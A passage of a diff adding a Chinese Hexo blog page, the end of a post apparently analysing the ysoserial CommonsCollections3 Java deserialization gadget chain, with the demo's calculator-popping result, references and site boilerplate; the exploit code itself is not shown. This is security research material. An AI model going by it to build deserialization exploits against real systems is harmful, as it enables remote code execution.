class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下:</p>
+<p><img src="6.png" alt=""></p>
+<p>可以看到弹出计算器的同时，也出现了一些报错信息。对于这些报错信息，ysoserial作者回应，在很多payload中会有这些错误的出现，但并不影响代码的执行。可参考<a href="https://github.com/frohoff/ysoserial/issues/69" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/issues/69</a>。</p>
+<p><img src="7.jpeg" alt=""></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://www.cnblogs.com/tr1ple/p/12201553.html#toc-1" target="_blank" rel="noopener">从0到1掌握某Json-TemplatesImpl链与ysoserial-jdk7u21的前因后果</a></li>
+<li><a href="http://blog.0kami.cn/2019/10/28/study-java-deserialized-commonscollections3-3/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections3</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/04/20/ysoserial-analyze/" rel="prev" title="ysoserial分析之CommonsCollections1">
+      <i class="fa fa-chevron-left"></i> ysoserial分析之CommonsCollections1
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#InstantiateTransformer类分析"><span class="nav-number">1.</span> <span class="nav-text">InstantiateTransformer类分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ChainedTranformer构造"><span class="nav-number">2.</span> <span class="nav-text">ChainedTranformer构造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#构造恶意类"><span class="nav-number">2.1.</span> <span class="nav-text">构造恶意类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整demo"><span class="nav-number">3.</span> <span class="nav-text">完整demo</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number"></span> <span class="nav-text">参考</span></a></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ananaskr</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ananaskr</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
